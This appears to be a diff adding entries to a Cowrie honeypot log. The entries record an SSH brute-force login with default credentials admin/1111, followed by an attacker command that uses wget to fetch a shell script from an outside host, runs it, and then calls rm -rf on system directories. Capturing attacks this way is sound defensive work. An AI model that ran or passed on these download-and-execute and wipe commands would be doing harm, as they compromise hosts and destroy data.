@@ -8003,3 +8003,45 @@
 2017-02-18T17:06:34+0000 [CowrieTelnetTransport,6769,200.116.35.212] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
 	]
 2017-02-18T17:06:34+0000 [CowrieTelnetTransport,6769,200.116.35.212] Connection lost after 104 seconds
+2017-02-18T17:09:56+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 210.94.133.54:48862 (10.8.41.81:2222) [session: deecdba8]
+2017-02-18T17:09:56+0000 [HoneyPotSSHTransport,15925,210.94.133.54] Remote SSH version: SSH-2.0-paramiko_1.7.5
+2017-02-18T17:09:56+0000 [HoneyPotSSHTransport,15925,210.94.133.54] kex alg, key alg: 'diffie-hellman-group1-sha1' 'ssh-rsa'
+2017-02-18T17:09:56+0000 [HoneyPotSSHTransport,15925,210.94.133.54] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-02-18T17:09:56+0000 [HoneyPotSSHTransport,15925,210.94.133.54] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-02-18T17:09:57+0000 [HoneyPotSSHTransport,15925,210.94.133.54] NEW KEYS
+2017-02-18T17:09:57+0000 [HoneyPotSSHTransport,15925,210.94.133.54] starting service 'ssh-userauth'
+2017-02-18T17:09:58+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,15925,210.94.133.54] 'admin' trying auth 'password'
+2017-02-18T17:09:58+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,15925,210.94.133.54] login attempt: 2
+2017-02-18T17:09:58+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,15925,210.94.133.54] login return, expect: [admin/1111]
+2017-02-18T17:09:58+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,15925,210.94.133.54] login attempt [admin/1111] succeeded
+2017-02-18T17:10:00+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,15925,210.94.133.54] 'admin' authenticated with 'password'
+2017-02-18T17:10:00+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,15925,210.94.133.54] starting service 'ssh-connection'
+2017-02-18T17:10:00+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,15925,210.94.133.54] got channel 'session' request
+2017-02-18T17:10:00+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,15925,210.94.133.54] channel open
+2017-02-18T17:10:00+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,15925,210.94.133.54] executing command "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://kysfag.3x.ro/bin.sh; chmod 777 bin.sh; sh bin.sh; rm -rf *"
+2017-02-18T17:10:00+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,15925,210.94.133.54] Opening TTY Log: log/tty/20170218-171000-deecdba8-0e.log
+2017-02-18T17:10:00+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,15925,210.94.133.54] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://kysfag.3x.ro/bin.sh; chmod 777 bin.sh; sh bin.sh; rm -rf *
+2017-02-18T17:10:00+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,15925,210.94.133.54] Command found: cd /tmp
+2017-02-18T17:10:00+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,15925,210.94.133.54] Command found: cd /var/run
+2017-02-18T17:10:00+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,15925,210.94.133.54] Command found: cd /mnt
+2017-02-18T17:10:00+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,15925,210.94.133.54] Command found: cd /root
+2017-02-18T17:10:00+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,15925,210.94.133.54] Command found: cd /
+2017-02-18T17:10:00+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,15925,210.94.133.54] Command found: wget http://kysfag.3x.ro/bin.sh
+2017-02-18T17:10:00+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://kysfag.3x.ro/bin.sh>
+2017-02-18T17:10:01+0000 [HTTPPageDownloader,client] Not storing duplicate content 4956cfbe6d27e64067cbc180c7f582e3c3b4f13d99a8ccf5b857d3c1742763f2
+2017-02-18T17:10:01+0000 [HTTPPageDownloader,client] Downloaded URL (http://kysfag.3x.ro/bin.sh) with SHA-256 4956cfbe6d27e64067cbc180c7f582e3c3b4f13d99a8ccf5b857d3c1742763f2 to dl/4956cfbe6d27e64067cbc180c7f582e3c3b4f13d99a8ccf5b857d3c1742763f2
+2017-02-18T17:10:01+0000 [HTTPPageDownloader,client] Command found: chmod 777 /bin.sh
+2017-02-18T17:10:01+0000 [HTTPPageDownloader,client] Command found: sh /bin.sh
+2017-02-18T17:10:01+0000 [HTTPPageDownloader,client] Command found: rm -rf /lost+found /vmlinuz /srv /sys /run /sbin /proc /mnt /bin /usr /tmp /var /initrd.img /etc /opt /boot /selinux /home /media /lib /root /dev /bin.sh
+2017-02-18T17:10:01+0000 [HTTPPageDownloader,client] exitCode: 0
+2017-02-18T17:10:01+0000 [HTTPPageDownloader,client] sending request 'exit-status'
+2017-02-18T17:10:01+0000 [HTTPPageDownloader,client] Not storing duplicate content 4956cfbe6d27e64067cbc180c7f582e3c3b4f13d99a8ccf5b857d3c1742763f2
+2017-02-18T17:10:01+0000 [HTTPPageDownloader,client] Saved redir contents with SHA-256 4956cfbe6d27e64067cbc180c7f582e3c3b4f13d99a8ccf5b857d3c1742763f2 to dl/4956cfbe6d27e64067cbc180c7f582e3c3b4f13d99a8ccf5b857d3c1742763f2
+2017-02-18T17:10:01+0000 [HTTPPageDownloader,client] Closing TTY Log: log/tty/20170218-171000-deecdba8-0e.log after 0 seconds
+2017-02-18T17:10:01+0000 [HTTPPageDownloader,client] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-02-18T17:10:01+0000 [HTTPPageDownloader,client] sending close 0
+2017-02-18T17:10:01+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://kysfag.3x.ro/bin.sh>
+2017-02-18T17:10:01+0000 [HoneyPotSSHTransport,15925,210.94.133.54] avatar admin logging out
+2017-02-18T17:10:01+0000 [HoneyPotSSHTransport,15925,210.94.133.54] connection lost
+2017-02-18T17:10:01+0000 [HoneyPotSSHTransport,15925,210.94.133.54] Connection lost after 4 seconds
